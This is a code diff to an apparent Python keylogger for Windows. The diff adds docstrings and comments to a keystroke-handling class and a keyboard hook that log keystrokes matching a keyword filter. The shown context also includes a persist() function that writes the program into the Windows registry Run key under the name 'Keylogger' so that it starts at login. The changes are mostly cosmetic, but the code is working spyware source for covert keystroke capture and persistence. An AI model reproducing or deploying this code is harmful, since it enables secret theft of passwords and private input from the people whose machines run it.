@@ -52,7 +52,11 @@ if MODE == 1:
 #################################
 
 class EventHandler(threading.Thread):
-	"""docstring for EventHandler."""
+	"""Handle every single keystroke event following this steps:
+		1- check the keystrokes in the buffer
+		2- check if the keystrokes are relevant with the key_words filter
+		3- log or discard the data according to the relevance of the data
+	"""
 	def __init__(self, mode, buffer):
 		super(EventHandler, self).__init__()
 		self.mode = mode
@@ -110,7 +114,7 @@ def on_keyboard(event):
 			key_pressed = '[RETURN]'
 		elif event.Ascii == 9: # tab pressed
 			key_pressed = '[TAB]'
-		elif event.Ascii == 8:
+		elif event.Ascii == 8: # back pressed
 			key_pressed = '[BACK]'
 		else:
 			# convert pressed key using Ascii look up table
@@ -123,6 +127,7 @@ def on_keyboard(event):
 			DATA = ''
 	return True
 
+# Persistence on registry:
 def persist():
 	'''Adds the executable file at startup Windows app'''
 	directory = os.path.dirname(os.path.realpath(__file__))
@@ -130,12 +135,6 @@ def persist():
 	sub_key = 'Software\Microsoft\Windows\CurrentVersion\Run'
 	with OpenKey(HKEY_CURRENT_USER, sub_key, 0, KEY_ALL_ACCESS) as key:
 		SetValueEx(key, "Keylogger", 0, REG_SZ, path_to_exe)
-
-
-#################################
-#		ALGORITHM RELEVANT  	#
-#################################
-
 
 ####################
 #		MAIN	   #
